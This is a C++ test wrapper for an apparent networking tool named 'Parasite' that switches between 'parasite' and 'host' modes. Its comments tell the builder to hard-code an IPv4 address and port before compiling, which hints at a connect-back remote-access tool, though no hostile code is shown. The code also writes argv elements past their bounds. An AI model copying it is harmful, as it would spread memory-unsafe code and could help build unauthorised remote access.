// Parasite _ main.cpp
// This is for testing purposes only.

/*
 * main.cpp is a TEST WRAPPER.
 >  It should not be compiled except for testing purposes.
 *
 * All Sub-tools are built to be standalone. There is no cross-linking.
 * Build all Sub-tools individualy by renaming their primary funtion to main().
 *
 * For windows_host.cpp: remove all arguments in main() function. 
 >  Replace instances of argv[1] with a static string containing the dot form of an IPv4 address.
 * 
 * The PORT is predefined and must be changed BEFORE compilation.
 */

#include <iostream>
#include <string>

#include "misc.h"

int main(int argc, char **argv) {

	bool run = true;
	std::string mode = "";

	if(argc < 2) {

		std::cout << "Enter mode: ";
		std::cin >> mode;

		if (mode == "parasite") {
			system("CLS");
			parasite();
		}
		else if (mode == "host") {

			std::string ipaddr = "";
			std::string port = "";
			
			std::cout << "Enter IPv4 Address: ";	// get from ipconfig on Windows
			std::cin.ignore();
			getline(std::cin, ipaddr);

			std::cout << "Enter Port: ";
			// std::cin.ignore();
			getline(std::cin, port);

			argv[0] = (char*)"parasite";
			argv[1] = (char*)"host";
			argv[2] = (char*)ipaddr.c_str();
			argv[3] = (char*)port.c_str();

			argc = 4;

			host(argc, argv);
		}
		else if (mode == "exit") {
			run = false;
		}
	}
	else {

		argv[0] = (char*)"parasite";
		argv[1] = (char*)"host";
		argv[2] = (char*)"";
		argv[3] = (char*)"27015";

		argc = 4;

		host(argc, argv);
	}
	
	return 0;
}
